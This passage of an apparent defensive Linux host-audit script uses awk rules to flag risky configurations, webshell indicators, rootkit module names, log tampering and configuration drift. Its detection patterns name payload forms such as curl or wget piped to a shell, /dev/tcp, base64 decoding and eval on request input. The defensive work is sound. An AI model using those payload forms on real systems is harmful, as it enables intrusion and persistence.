    if (p ~ /\/pam.d\//) {
        if (s ~ /pam_exec[.]so|pam_script[.]so/) emit("PAM001","HIGH","PAM executes an external command")
        if (s ~ /^[ \t]*auth[ \t]+sufficient[ \t]+pam_permit[.]so/) emit("PAM002","HIGH","Review authentication stack with sufficient pam_permit; service context determines bypass risk")
        if (s ~ /\/(tmp|home|opt|dev\/shm)\/.*[.]so/) emit("PAM003","CRIT","PAM module outside standard library paths")
    }
    if (p ~ /nsswitch.conf$/ && s ~ /(passwd|shadow|group):/ && s !~ /^[ \t]*#/ && s ~ /[ \t](exec|compat.*exec|backdoor)/)
        emit("NSS001","HIGH","Unexpected NSS identity provider")
    if (p ~ /udev\/rules.d/ && s ~ /run[+]?=/) emit("PER110","MED","udev rule executes a program")
    if (p ~ /modprobe.d/ && s ~ /^[ \t]*install[ \t]/) emit("PER111","HIGH","modprobe install command overrides module loading")
    if (p ~ /apt.conf.d|\/dnf\/|\/yum/ && s ~ /pre-invoke|post-invoke|command[ \t]*=/) emit("PER112","HIGH","Package-manager execution hook")
    if (p ~ /inetd/ && s ~ /server[ \t]*=|stream[ \t].*nowait/) emit("PER113","MED","inetd service launch configuration")
    if (p ~ /autostart/ && s ~ /^exec=/) emit("PER114","MED","Desktop autostart command")
    if (p ~ /aliases$|[.]forward$/ && v ~ /[|]/) emit("SMTP001","HIGH","Mail forwarding pipes messages to a command")
    if (p ~ /postfix|exim/ && s ~ /mynetworks.*0[.]0[.]0[.]0\/0|relay_from_hosts.*\*|relay_domains[ \t]*=[ \t]*\*/) emit("SMTP002","HIGH","Mail relay trust appears unrestricted")
    if (p ~ /named|\/bind\//) {
        if (s ~ /allow-recursion.*any|allow-query-cache.*any/) emit("DNS001","HIGH","DNS recursion/cache access granted to any client")
        if (s ~ /allow-transfer.*any/) emit("DNS002","HIGH","DNS zone transfers granted to any client")
        if (s ~ /allow-update.*any/) emit("DNS003","CRIT","DNS updates granted to any client")
        if (s ~ /also-notify|update-policy/) emit("DNS004","INFO","Review DNS notification or dynamic-update grants")
    }
    if (p ~ /vsftpd|proftpd/) {
        if (s ~ /anonymous_enable[ \t]*=[ \t]*yes|<anonymous/) emit("FTP001","MED","Anonymous FTP configuration")
        if (s ~ /anon_upload_enable[ \t]*=[ \t]*yes|anon_mkdir_write_enable[ \t]*=[ \t]*yes/) emit("FTP002","HIGH","Anonymous FTP write enabled; check webroot overlap")
        if (s ~ /chroot_local_user[ \t]*=[ \t]*no/) emit("FTP003","MED","FTP local users are not chrooted")
    }
    if (p ~ /mysql|my.cnf/) {
        if (s ~ /^[ \t]*skip-grant-tables/) emit("SQL001","CRIT","Database grant-table authentication disabled")
        if (s ~ /^[ \t]*(init_file|init-file|init_connect|init-connect)[ \t]*=/) emit("SQL002","HIGH","Database startup/connect execution hook")
        if (s ~ /^[ \t]*plugin[-_]load/) emit("SQL003","MED","Database plugin configured for loading")
        if (s ~ /^[ \t]*secure[-_]file[-_]priv[ \t]*=[ \t]*$/) emit("SQL004","HIGH","Database file import/export directory unrestricted")
    }
    if (p ~ /php|[.]user.ini|[.]htaccess|nginx|apache|httpd/) {
        if (s ~ /auto_(prepend|append)_file[ \t=]+[^ \t]/ && s !~ /[ \t=](none|off)[ \t]*$/) emit("WEB101","HIGH","PHP automatic file execution configured")
        if (s ~ /php_(admin_)?value.*(prepend|append)|addhandler.*php|sethandler.*php/) emit("WEB102","MED","Web configuration changes script handling")
        if (s ~ /disable_functions[ \t]*=[ \t]*$/) emit("WEB103","MED","PHP disable_functions is empty")
        if (s ~ /proxy_pass|proxypass|scriptalias/) emit("WEB104","INFO","Review web proxy or CGI route")
    }
    if (p ~ /pg_hba.conf/ && s ~ /^[ \t]*(host|local)[ \t].*[ \t]trust([ \t]|$)/) emit("PG001","HIGH","PostgreSQL trust authentication rule")
    if (p ~ /redis/ && s ~ /^[ \t]*protected-mode[ \t]+no/) emit("REDIS001","HIGH","Redis protected mode disabled")
    if (p ~ /mongo/ && s ~ /authorization:[ \t]*disabled|^[ \t]*noauth[ \t]*=[ \t]*true/) emit("MONGO001","HIGH","MongoDB authorization disabled")
    if (p ~ /mosquitto/ && s ~ /allow_anonymous[ \t]+true/) emit("MQTT001","MED","MQTT anonymous clients allowed")
    if (p ~ /rsync/ && s ~ /read only[ \t]*=[ \t]*false|use chroot[ \t]*=[ \t]*false/) emit("RSYNC001","MED","Rsync writable or unconfined module")
    if (p ~ /supervisor/ && s ~ /chmod[ \t]*=[ \t]*0?777/) emit("SUP001","HIGH","Supervisor control socket configured world writable")
    if (p ~ /snmp/ && s ~ /^[ \t]*rwcommunity[ \t]/) emit("SNMP001","HIGH","SNMP write community configured")
    if (p ~ /elasticsearch/ && s ~ /xpack.security.enabled[ \t]*:[ \t]*false/) emit("ES001","HIGH","Elasticsearch authentication disabled")
    if (p ~ /config.xml/ && s ~ /<usesecurity>false<\/usesecurity>/) emit("CI001","HIGH","CI application security disabled")
    if (p ~ /docker|compose|kubernetes/ && s ~ /privileged[ \t]*:[ \t]*true|host(pid|network)[ \t]*:[ \t]*true|docker[.]sock/) emit("CTR010","HIGH","Container configuration grants host-level access")
    if (p ~ /sssd/ && s ~ /ldap_id_use_start_tls[ \t]*=[ \t]*false|ldap_tls_reqcert[ \t]*=[ \t]*never/) emit("LDAP001","HIGH","LDAP transport verification weakened")
    if (p ~ /logrotate|rsyslog/ && s ~ /\/(tmp|dev\/shm)\//) emit("LOG010","MED","Logging configuration references a temporary directory")
    if (p ~ /exports/ && s ~ /no_root_squash/) emit("NFS001","HIGH","NFS export trusts remote root")
    if (p ~ /exports/ && s ~ /\*\([^)]*rw/) emit("NFS002","HIGH","Writable NFS export to any client")
    if (p ~ /samba/ && s ~ /guest ok[ \t]*=[ \t]*yes|public[ \t]*=[ \t]*yes/) emit("SMB001","MED","Samba guest share enabled")
    if (p ~ /samba/ && s ~ /wide links[ \t]*=[ \t]*yes/) emit("SMB002","HIGH","Samba wide links enabled")
    if (p ~ /sshd_config.d/ && s ~ /permitrootlogin[ \t]+yes|permitemptypasswords[ \t]+yes|authorizedkeyscommand|forcecommand|permituserenvironment[ \t]+yes/) emit("SSH020","HIGH","Sensitive SSH directive in included configuration")
    if (s ~ /(curl|wget).*\|[ \t]*(ba)?sh|\/dev\/tcp\/|base64[ \t]+(-d|--decode)/) emit("PER100","CRIT","Payload-like command in configuration")
    if (p ~ /systemd/ && s ~ /exec(start|stop|reload).*=[-+!:@]*\/(tmp|dev\/shm|var\/tmp)\//) emit("PER101","HIGH","Systemd executes from a writable temporary directory")
    next
}
{print}
AWKEOF

# Scores accrue once per signal per file, not once per repeated matching line.
read -r -d '' WEBSHELL_PROG <<'AWKEOF' || true
BEGIN {OFS="\t"}
function report(  score,k,sev,conf,p) {
    if (file=="") return
    score=0; for(k in hit) score+=hit[k]
    if(score>=5) {
        sev=(score>=20?"CRIT":(score>=10?"HIGH":"MED"))
        conf=(score>=20?"likely":"possible")
        p=file; gsub(/[\t\r\n]/,"?",p)
        print "FIND","WEB001",sev,"webshell",conf,"Weighted webshell indicators",p,"score=" score "; static heuristic; verify before removal","inspect_webshell"
    }
    for(k in hit) delete hit[k]
}
FNR==1 {report(); file=FILENAME}
{
    s=tolower($0)
    if (s !~ /eval|assert|base64|gzinflate|shell_exec|passthru|system|exec|request|post|php|preg_replace|frombase64|process.start|runtime.getruntime|chr\(/) next
    if(s ~ /(eval|assert)[ \t]*\(/) hit["eval"]=6
    if(s ~ /base64_decode[ \t]*\(|frombase64string/) hit["decode"]=4
    if(s ~ /gzinflate[ \t]*\(|gzuncompress[ \t]*\(/) hit["inflate"]=4
    if(s ~ /(shell_exec|passthru|system|popen|proc_open)[ \t]*\(/) hit["exec"]=6
    if(s ~ /\$_(post|get|request|cookie)[ \t]*\[/) hit["input"]=5
    if(s ~ /(eval|assert|system|shell_exec|passthru)[ \t]*\([ \t]*\$_(post|get|request|cookie)/) hit["direct"]=10
    if(s ~ /runtime[.]getruntime[ \t]*\(\)[.]exec|process[.]start[ \t]*\(/) hit["managed-exec"]=10
    if(s ~ /chr[ \t]*\([0-9]+\)[ \t]*[.]?[ \t]*chr[ \t]*\(/) hit["obfuscation"]=4
    if(FNR<=3 && FILENAME ~ /[.](ico|jpg|png)$/ && s ~ /<\?php/) hit["disguise"]=12
}
END {report()}
AWKEOF

chk_webshell() {
    if (( ${#WEB_FILES[@]} == 0 )); then ok WEB000 "no eligible web-script candidates in selected coverage"; return; fi
    # argv comes from NUL-safe enumeration, never a generated command string.
    local rc
    run_bounded 60 awk "$WEBSHELL_PROG" "${WEB_FILES[@]}"; rc=$?
    (( rc == 0 )) || skip WEB000 "webshell scan failed or exceeded budget (rc=$rc)"
    ok WEB000 "${#WEB_FILES[@]} candidates scored; files over 2 MiB excluded"
}

chk_hunt() {
    [[ -n $OPT_HUNT ]] || { ok HNT000 "content hunt not requested"; return; }
    local f size n=0 start=$SECONDS line
    for f in "${FILES[@]}"; do
        (( SECONDS - start < 60 )) || { skip HNT000 "hunt budget exceeded"; break; }
        [[ -r $f && ! -L $f ]] || continue
        size=$(stat -c %s -- "$f" 2>/dev/null) || continue
        (( size < 2097152 )) || continue
        # Environment transfer preserves regex backslashes unlike awk -v.
        line=$(BLUESWEEP_HUNT="$OPT_HUNT" run_bounded 2 awk 'BEGIN{r=ENVIRON["BLUESWEEP_HUNT"]} $0 ~ r {print FNR; exit}' "$f")
        if [[ -n $line ]]; then
            finding HNT001 INFO hunt untrusted-source "Content hunt match" "$f" "line=$line; content withheld" inspect_file
            n=$((n + 1))
            (( n < MAX_PER_CAT )) || { skip HNT001 "hunt results truncated=1"; break; }
        fi
    done
    ok HNT000 "$n matching files in bounded candidate set"
}

chk_logs() {
    local f size h u rest link n=0
    for f in "$ROOT/var/log/wtmp" "$ROOT/var/log/btmp" "$ROOT/var/log/lastlog" "$ROOT/var/log/auth.log" "$ROOT/var/log/secure" "$ROOT/var/log/audit/audit.log"; do
        [[ -f $f ]] || continue
        size=$(stat -c %s -- "$f" 2>/dev/null) || { skip LOG001 "cannot stat $f"; continue; }
        (( size == 0 )) && finding LOG001 MED logs possible "Empty authentication/accounting log" "$f" "new systems and rotation can also produce empty logs" review_logs
        n=$((n + 1))
    done
    if [[ -r $ROOT/etc/passwd ]]; then
        while IFS=: read -r u _ _ _ _ h rest; do
            [[ $h == /* ]] || continue
            for f in "$ROOT$h/.bash_history" "$ROOT$h/.zsh_history"; do
                if [[ -L $f ]]; then
                    link=$(readlink -- "$f" 2>/dev/null)
                    [[ $link == /dev/null ]] && finding LOG002 HIGH logs likely "Shell history redirected to /dev/null" "$f" "owner=$u" review_logs
                elif [[ -f $f && ! -s $f ]]; then
                    finding LOG003 LOW logs possible "Empty shell history" "$f" "can be normal for unused accounts" review_logs
                fi
            done
        done < "$ROOT/etc/passwd"
    fi
    if [[ -z $ROOT ]] && have auditctl; then
        local rules
        rules=$(run_bounded 5 auditctl -l); local rc=$?
        if (( rc != 0 )); then skip LOG004 "audit rules unreadable";
        elif [[ $rules == 'No rules' || -z $rules ]]; then finding LOG004 MED logs untrusted-source "No audit rules loaded" auditd "auditctl -l" review_audit;
        else obs AUDIT rules "$rules"; fi
    else skip LOG004 "live auditctl unavailable; audit rules unknown"; fi
    ok LOG000 "$n accounting logs inspected; no truncation claim without a baseline"
}

chk_kernel() {
    (( CAP_PROC == 1 )) || { skip KRN000 "live kernel files unavailable"; return; }
    local f name size refs deps state addr line n=0 taint=0 i
    local -A mods=()
    if [[ -r $PROCFS/modules ]]; then
        while read -r name size refs deps state addr rest; do
            mods[$name]=1; obs MOD "$name" "$size:$deps"
            [[ -d $ROOT/sys/module/$name ]] || finding KRN001 HIGH rootkit possible "Loaded module missing from sysfs" "$name" "could be unload race or restricted sysfs" capture_memory
            case ${name,,} in *diamorphine*|*reptile*|*suterusu*|*adore*|*khook*) finding KRN002 CRIT rootkit likely "Known rootkit-like module name" "$name" "name match; verify provenance" capture_memory ;; esac
            n=$((n + 1))
        done < "$PROCFS/modules"
        for f in "$ROOT/sys/module"/*/initstate; do
            [[ -r $f ]] || continue
            name=${f%/initstate}; name=${name##*/}
            [[ -n ${mods[$name]:-} ]] || finding KRN003 HIGH rootkit possible "Loadable module has initstate but is absent from /proc/modules" "$name" "built-in modules excluded; unload races remain possible" capture_memory
        done
    else skip KRN001 "cannot read /proc/modules"; fi
    if [[ -r $PROCFS/sys/kernel/tainted ]]; then
        read -r taint < "$PROCFS/sys/kernel/tainted"
        if [[ $taint =~ ^[0-9]+$ ]]; then
            local -a labels=(proprietary forced-load out-of-spec forced-unload machine-check bad-page userspace-request kernel-died acpi-override warning staging firmware-workaround out-of-tree unsigned soft-lockup livepatch auxiliary randstruct kernel-test fwctl-debug)
            for ((i=0; i<${#labels[@]}; i++)); do
                if (( (taint & (1 << i)) != 0 )); then
                    finding KRN004 MED rootkit possible "Kernel taint: ${labels[$i]}" kernel "bit=$i value=$taint; taint alone is not evidence of compromise" review_kernel
                fi
            done
            obs KERNEL tainted "$taint"
        fi
    else skip KRN004 "kernel taint unreadable"; fi
    for f in "$ROOT/sys/kernel/tracing/enabled_functions" "$ROOT/sys/kernel/debug/tracing/enabled_functions"; do
        [[ -r $f ]] || continue
        local hooks=0
        while IFS= read -r line && (( hooks < MAX_PER_CAT )); do
            [[ -n $line ]] || continue
            hooks=$((hooks + 1))
            finding KRN005 MED rootkit possible "Active ftrace hook; correlate with observability tools" "$f" "$line" review_kernel
        done < "$f"
        break
    done
    [[ -r $f ]] || skip KRN005 "ftrace enabled_functions unavailable"
    if [[ -r $PROCFS/kallsyms ]]; then
        run_bounded 5 awk 'BEGIN{OFS="\t"} tolower($3) ~ /diamorphine|suterusu|reptile|hacked_(getdents|kill|tcp)/ {print "FIND","KRN006","HIGH","rootkit","likely","Rootkit-like kernel symbol",$3,"symbol-name heuristic","capture_memory"}' "$PROCFS/kallsyms" || skip KRN006 "kernel symbol scan incomplete"
    else skip KRN006 "kernel symbols unreadable"; fi
    if [[ -r $PROCFS/self/mountinfo ]]; then
        while IFS= read -r line; do
            read -r _ _ _ src f rest <<< "$line"
            obs MOUNT "$f" "$src $rest"
            case $f in /bin|/sbin|/usr/bin|/usr/sbin|/etc/ld.so.preload|/etc/passwd|/etc/shadow)
                [[ $src != / ]] && finding KRN007 HIGH rootkit possible "Subtree or file mount shadows a sensitive path" "$f" "root=$src; containers can legitimately do this" review_mount ;;
            esac
        done < "$PROCFS/self/mountinfo"
    fi
    for f in "$ROOT/dev/shm"/.[!.]* "$ROOT/dev"/.[!.]*; do
        [[ -e $f ]] || continue
        finding KRN008 MED rootkit possible "Hidden entry in a device or shared-memory directory" "$f" "may belong to legitimate IPC software" inspect_file
    done
    ok KRN000 "$n modules inventoried; coherent kernel tampering can evade all userland checks"
}

chk_hardening() {
    local key want value f
    if (( CAP_PROC == 1 )); then
        while read -r key want; do
            f="$PROCFS/sys/${key//.//}"
            [[ -r $f ]] || { skip HRD001 "unreadable sysctl $key"; continue; }
            read -r value < "$f"
            obs SYSCTL "$key" "$value"
            [[ $value == "$want" ]] || finding HRD001 MED hardening confirmed "Review kernel hardening setting" "$key" "observed=$value suggested=$want; workload exceptions may apply" review_sysctl
        done <<'SYSCTLS'
kernel.randomize_va_space 2
kernel.kptr_restrict 2
kernel.dmesg_restrict 1
kernel.yama.ptrace_scope 1
fs.protected_hardlinks 1
fs.protected_symlinks 1
net.ipv4.conf.all.accept_redirects 0
net.ipv4.conf.all.send_redirects 0
net.ipv4.conf.all.rp_filter 1
SYSCTLS
    else skip HRD001 "sysctl runtime state unavailable offline"; fi
    if [[ -r $ROOT/sys/fs/selinux/enforce ]]; then
        read -r value < "$ROOT/sys/fs/selinux/enforce"
        [[ $value == 1 ]] || finding HRD002 MED hardening confirmed "SELinux is permissive" SELinux "enforce=$value" review_mac
    elif [[ -r $ROOT/sys/module/apparmor/parameters/enabled ]]; then
        read -r value < "$ROOT/sys/module/apparmor/parameters/enabled"
        obs MAC apparmor "$value"
        [[ $value == Y ]] || finding HRD002 MED hardening confirmed "AppArmor disabled" AppArmor "$value" review_mac
    else skip HRD002 "SELinux/AppArmor runtime state unavailable"; fi
    if [[ -z $ROOT ]]; then
        local rules rc=1
        if have nft; then
            rules=$(run_bounded 5 nft list ruleset); rc=$?
            (( rc == 0 )) && obs FIREWALL nft "$rules"
        fi
        if (( rc != 0 )) && have iptables-save; then
            rules=$(run_bounded 5 iptables-save); rc=$?
            (( rc == 0 )) && obs FIREWALL iptables "$rules"
        fi
        if (( rc != 0 )); then skip HRD003 "cannot read firewall rules (tools/privilege unavailable)";
        elif [[ -z $rules ]]; then finding HRD003 MED hardening untrusted-source "Empty host firewall ruleset" firewall "external filtering may still apply" review_firewall;
        else finding HRD004 INFO network untrusted-source "Firewall rules inventoried, including NAT" firewall "review FIREWALL observation for redirects and policies" review_firewall; fi
    else skip HRD003 "firewall runtime state unavailable offline"; fi
    for f in "$ROOT/sys/class/net"/*/flags; do
        [[ -r $f ]] || continue
        read -r value < "$f"
        [[ $value =~ ^0x[0-9a-fA-F]+$ ]] || continue
        key=${f%/flags}; key=${key##*/}
        obs IFACE "$key" "$value"
        (( (value & 0x100) == 0 )) || finding NET020 MED network possible "Interface is promiscuous" "$key" "bridges and capture tools can require this" review_network
    done
    if [[ -r $PROCFS/net/packet ]]; then
        local line=0 text
        while IFS= read -r text; do
            line=$((line + 1)); (( line > 1 )) || continue
            finding NET021 INFO network possible "Packet socket active" AF_PACKET "$text; correlate with DHCP and security tooling" review_network
        done < "$PROCFS/net/packet"
    fi
    ok HRD000 "posture checks completed; exceptions require workload context"
}

chk_services() {
    (( CAP_PROC == 1 )) || { skip SRV000 "live service identification unavailable offline; static configs still scanned"; return; }
    local pid cmd exe name row proto addr port uid ino owner n=0
    for pid in "${PROC_PIDS[@]}"; do
        name=${PROC_COMM[$pid]:-}; cmd=${PROC_CMD[$pid]:-}; exe=${PROC_EXE[$pid]:-}
        case $name in
            distccd|named|postfix|master|exim*|vsftpd|proftpd|mysqld|mariadbd|*vnc*|*VNC*|apache2|httpd|nginx|php-fpm*|*modbus*) ;;
            *) continue ;;
        esac
        n=$((n + 1)); obs SERVICE "$name:$exe" running
        [[ $name == distccd ]] && finding SRV001 HIGH services confirmed "distccd is running; review permitted clients" "pid=$pid" "$exe" review_distcc
        case $name in *vnc*|*VNC*)
            [[ $cmd == *-nopw* || $cmd == *SecurityTypes=None* ]] && finding SRV002 CRIT services likely "VNC appears to allow unauthenticated access" "pid=$pid" "$cmd" review_vnc ;;
        esac
        for row in "${LISTEN_ROWS[@]}"; do
            IFS='|' read -r proto addr port uid ino <<< "$row"
            owner=${SOCK_PID[$ino]:-}
            [[ $owner == "$pid" ]] || continue
            finding SRV003 INFO services confirmed "Observed service listener" "$name" "$proto $addr:$port uid=$uid exe=$exe" review_service
            case $addr in 127.*|::1) ;; *)
                case $name in distccd|*vnc*|*VNC*) finding SRV004 HIGH services likely "Sensitive service bound beyond loopback" "$name" "$addr:$port; verify allowed peers" review_service ;; esac ;;
            esac
            [[ $name == distccd && $uid == 0 ]] && finding SRV005 CRIT services confirmed "distccd listener runs as root" "$exe" "$addr:$port" review_distcc
        done
        case $name in mysqld|mariadbd)
            skip SQL010 "SQL grants, account passwords and mysql.func require authenticated database inspection; no credentials used" ;;
        esac
    done
    for row in "${LISTEN_ROWS[@]}"; do
        IFS='|' read -r proto addr port uid ino <<< "$row"
        if [[ $port == 502 ]]; then
            finding SRV006 INFO services possible "Possible Modbus/ICS listener; preserve process availability" "$addr:$port" "port heuristic only; owner_pid=${SOCK_PID[$ino]:-unknown}" preserve_ics
        fi
    done
    ok SRV000 "$n service processes inspected; identity determines checks across relocated ports"
}

chk_packages() {
    [[ $OPT_MODE == full ]] || { ok PKG000 "package verification reserved for --full"; return; }
    [[ -z $ROOT ]] || { skip PKG000 "offline package verification is not run against host databases"; return; }
    local line rc n=0
    local -a command=()
    if have dpkg; then command=(dpkg --verify);
    elif have rpm; then command=(rpm -Va --noscripts);
    else skip PKG000 "no dpkg/rpm verifier available"; return; fi
    while IFS= read -r line; do
        if [[ $line == @STATUS:* ]]; then
            rc=${line#@STATUS:}
            # rpm/dpkg may return 1 for mismatches; output is evidence.
            [[ $rc == 0 || ( $rc == 1 && $n != 0 ) ]] || skip PKG000 "verification failed or budget exceeded rc=$rc"
        else
            n=$((n + 1))
            if (( n <= MAX_PER_CAT )); then finding PKG001 MED integrity untrusted-source "Package verification mismatch" package "$line; package database may itself be tampered" review_package;
            elif (( n == MAX_PER_CAT + 1 )); then skip PKG001 "package mismatch output truncated=1"; fi
        fi
    done < <(run_bounded 60 "${command[@]}"; printf '@STATUS:%d\n' "$?")
    ok PKG000 "$n package verification records; no package scripts executed"
}

# Canonical observation schema shared by snapshot and diff. Volatile process
# IDs, socket inodes, log lengths, uptime and ephemeral fd ownership are omitted.
read -r -d '' SNAPSHOT_PROG <<'AWKEOF' || true
BEGIN {FS=OFS="\t"}
$1=="META" {if($2=="root") root=$3; if($2!="caps" && $2!="when") print; next}
$1=="SKIP" {incomplete=1; print; next}
END {if(!keep && incomplete) exit 3}
$1=="FIND" || $1=="OK" {if(keep) print; next}
$1!="OBS" {next}
{
    t=$2; k=$3; v=$4
    if(t ~ /^(FILE|SUID|USER|SSHKEY|LISTEN|MOD|SYSCTL|IFACE|MOUNT|AGENT|SERVICE|SSHD|MAC|KERNEL|STARTUP_FILE|GROUP|SHADOW_META|PKG|CONTROL_SOCKET|AGENT_CONFIG)$/) {
        if(t=="AGENT") sub(/:[0-9]+$/,"",v)
        if(t=="LISTEN") {sub(/pid=[0-9]+ /,"",v)}
    } else if(t ~ /^(CRON|UNITEXEC|UNITCFG|UNITTIMER|RCLINE|CONFIG|SUDOERS)$/) {
        # Stable content identity avoids dropping multiple lines with one key.
        if(root!="/" && root!="" && index(k,root)==1) k=substr(k,length(root)+1)
        k=k "|" v; v="present"
    } else if(t=="PROC_ID") {t="PROC"
    } else next
    if(root!="/" && root!="" && index(k,root)==1) k=substr(k,length(root)+1)
    id=t SUBSEP k
    if(!(id in seen)) {
        bytes+=length(t)+length(k)+length(v)+8; count++
        if(bytes>50000000 || count>200000) {
            if(!capped++) print "SKIP","SNAP001","snapshot record/byte cap exceeded; truncated=1"
            incomplete=1; next
        }
        print "OBS",t,k,v; seen[id]=1
    }
}
AWKEOF

read -r -d '' DIFF_PROG <<'AWKEOF' || true
BEGIN {FS=OFS="\t"; max=20000}
function drift(action,t,k,b,c,  sev,old,new) {
    sev="MED"
    if(action=="ADDED" && t ~ /^(SUID|SSHKEY|MOD|USER|CRON)$/) sev="CRIT"
    if(action=="ADDED" && t ~ /^(LISTEN|UNITEXEC|UNITCFG|CONFIG|RCLINE)$/) sev="HIGH"
    if(action=="CHANGED" && t=="FILE" && k ~ /^\/(etc\/(passwd|shadow|sudoers|ld.so.preload)|usr\/(bin|sbin)\/|bin\/|sbin\/)/) sev="CRIT"
    if(action=="CHANGED" && t=="FILE") {
        split(b,old,":"); split(c,new,":")
        if(old[1]==new[1] && old[2]==new[2] && old[3]==new[3] && old[4]==new[4] && old[6]==new[6] && old[6]!="metadata-only") sev="MED"
    }
    if(action=="CHANGED" && t=="STARTUP_FILE") sev="HIGH"
    if(action=="CHANGED" && t=="SSHKEY") sev="CRIT"
    if(t=="AGENT" && (action=="REMOVED" || (b=="running" && c!="running"))) sev="CRIT"
    if(action=="REMOVED" && t ~ /^(USER|SSHKEY)$/) sev="INFO"
    print "FIND","DIF001",sev,"drift","confirmed",action " " t,k,"before=" b "; after=" c,"review_drift"
}
$1=="MARK" {cur=1; next}
!cur {
    if($1=="OBS") B[$2 SUBSEP $3]=$4
    if($1=="META") BM[$2]=$3
    next
}
$1=="META" {
    if($2=="epoch") print "META","baseline_age_seconds",$3-BM["epoch"]
    print; next
}
$1=="SKIP" {incomplete=1; print; next}
$1=="OBS" {
    k=$2 SUBSEP $3
    if(!(k in B)) drift("ADDED",$2,$3,"",$4)
    else if(B[k]!=$4) drift("CHANGED",$2,$3,B[k],$4)
    seen[k]=1
    print; next
}
$1=="FIND" && $3=="INFO" {next}
{print}
END {
    if(incomplete) print "SKIP","DIF002","Removal detection suppressed because collection is incomplete"
    else for(k in B) if(!(k in seen)) {split(k,a,SUBSEP); drift("REMOVED",a[1],a[2],B[k],"")}
}
AWKEOF

read -r -d '' JSON_PROG <<'AWKEOF' || true
BEGIN {
    FS="\t"; file=ENVIRON["BLUESWEEP_JSON"]
    rank["LOW"]=10;rank["MED"]=20;rank["HIGH"]=30;rank["CRIT"]=40
    for(i=1;i<32;i++) control[sprintf("%c",i)]=sprintf("\\u%04x",i)
}
function q(s,  i,c,r) {
    r="\""
    for(i=1;i<=length(s);i++) {
        c=substr(s,i,1)
        if(c=="\\") r=r "\\\\"
        else if(c=="\"") r=r "\\\""
        else if(c in control) r=r control[c]
        else r=r c
    }
    return r "\""
}
{
    if($1=="SIG") {if(file!="-") print; next}
    obj="{\"record\":" q($1)
    if($1=="FIND") {
        split("check_id severity category confidence title target evidence fix_id",names," ")
        for(i=2;i<=9;i++) obj=obj "," q(names[i-1]) ":" q($i)
        if(rank[$3]>worst) worst=rank[$3]
        if($3=="ERROR") incomplete=1
    } else {
        obj=obj ",\"fields\":["
        for(i=2;i<=NF;i++) obj=obj (i==2?"":",") q($i)
        obj=obj "]"
    }
    if($1=="SKIP") incomplete=1
    obj=obj "}"
    if(file=="-") print obj
    else { print obj > file; print }
}
END {if(file=="-") {if(exitzero) exit 0; if(incomplete) exit 3; exit worst}}
AWKEOF

prepare_output() {
    local path=$1
    [[ $path != - ]] || return 0
    # Never overwrite evidence, a symlink, or a preexisting file implicitly.
    ( set -o noclobber; : > "$path" ) 2>/dev/null || {
        warn "cannot create output (must be a new writable path): $path"; return 2;
    }
}

validate_diff() {
    [[ -f $OPT_DIFF && -r $OPT_DIFF ]] || { warn "baseline unreadable"; return 2; }
    local size line tag key value schema='' hash='' host='' machine='' mode='' epoch=''
    size=$(stat -c %s -- "$OPT_DIFF" 2>/dev/null) || return 2
    (( size <= 52428800 )) || { warn "baseline exceeds 50 MiB limit"; return 2; }
    awk -F '\t' '
        $1=="META" {if(NF!=3) bad=1; next}
        $1=="OBS" {if(NF!=4 || $2=="" || $3=="") bad=1; next}
        $1=="SKIP" {if(NF!=3) bad=1; next}
        {bad=1}
        END {exit bad}
    ' "$OPT_DIFF" || { warn "invalid baseline record format"; return 2; }
    # Baselines are DATA, never sourced or evaluated as shell.
    while IFS=$'\t' read -r tag key value; do
        [[ $tag == META ]] || continue
        case $key in schema) schema=$value ;; hash) hash=$value ;; host) host=$value ;; machine_id) machine=$value ;; mode) mode=$value ;; epoch) epoch=$value ;; esac
    done < "$OPT_DIFF"
    [[ $schema == 1 && $epoch =~ ^[0-9]+$ ]] || { warn "invalid baseline schema/epoch"; return 2; }
    [[ $hash == "$CAP_HASH" ]] || { warn "baseline hash algorithm differs ($hash vs $CAP_HASH)"; return 2; }
    [[ $mode == "$OPT_MODE" ]] || { warn "baseline mode differs; use --$mode"; return 2; }
    if (( OPT_FORCE == 0 )) && { [[ $host != "$HOST_ID" ]] || [[ $machine != "$MACHINE_ID" ]]; }; then
        warn "baseline host/machine-id mismatch; --force explicitly overrides identity only"; return 2
    fi
}

snapshot_stream() ( set -o pipefail; collect_all | awk "$SNAPSHOT_PROG"; )

scan_stream() {
    if [[ -n $OPT_DIFF ]]; then
        { cat -- "$OPT_DIFF"; printf 'MARK\n';
          { emit_sig_tables; collect_all; } | awk "$RULES_PROG" | awk "$CONFIG_RULES" | awk -v keep=1 "$SNAPSHOT_PROG";
        } | awk "$DIFF_PROG"
    else
        { emit_sig_tables; collect_all; } | awk "$RULES_PROG" | awk "$CONFIG_RULES"
    fi
}

# Evidence exports preserve the raw stream and individually hashed selected
# logs. Credentials and private SSH keys are not copied automatically.
export_artifacts() {
    local dir=$1 f dest hash count=0
    mkdir -- "$dir/artifacts" || return 2
    printf 'artifact\tsource\talgorithm\tdigest\n' > "$dir/manifest.tsv"
    for f in "$ROOT/etc/passwd" "$ROOT/etc/group" "$ROOT/etc/hosts" "$ROOT/etc/resolv.conf" \
             "$ROOT/etc/ssh/sshd_config" "$ROOT/var/log/auth.log" "$ROOT/var/log/secure" \
             "$ROOT/var/log/wtmp" "$ROOT/var/log/btmp" "$ROOT/var/log/lastlog" \
             "$ROOT/var/log/audit/audit.log" "$ROOT/var/log/nginx/access.log" "$ROOT/var/log/apache2/access.log"; do
        [[ -f $f && -r $f && ! -L $f ]] || continue
        count=$((count + 1)); dest="artifacts/$count"
        # Bounded prefix makes collection predictable; truncation is in manifest.
        dd if="$f" of="$dir/$dest" bs=1048576 count=8 status=none 2>/dev/null || return 3
        hash=$(hash_stream < "$dir/$dest") || return 3
        logical_path "$f"
        printf '%s\t%s (first 8 MiB)\t%s\t%s\n' "$dest" "$LOGICAL" "$CAP_HASH" "$hash" >> "$dir/manifest.tsv"
    done
    for f in "$dir/records.tsv" "$dir/findings.ndjson" "$dir/report.md" "$dir/remediation.sh"; do
        [[ -f $f ]] || continue
        hash=$(hash_stream < "$f") || return 3
        printf '%s\tgenerated\t%s\t%s\n' "${f##*/}" "$CAP_HASH" "$hash" >> "$dir/manifest.tsv"
    done
    hash=$(hash_stream < "$dir/manifest.tsv") || return 3
    printf '%s  manifest.tsv\n' "$hash" > "$dir/manifest.digest"
}

write_ir() {
    local dir=$1
    {
        printf '# Incident response evidence\n\n'
        printf 'Host: %s. Collection UTC: %s.\n\n' "$HOST_ID" "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
        printf 'This is a triage report, not attribution. Confirm each event against independent evidence.\n'
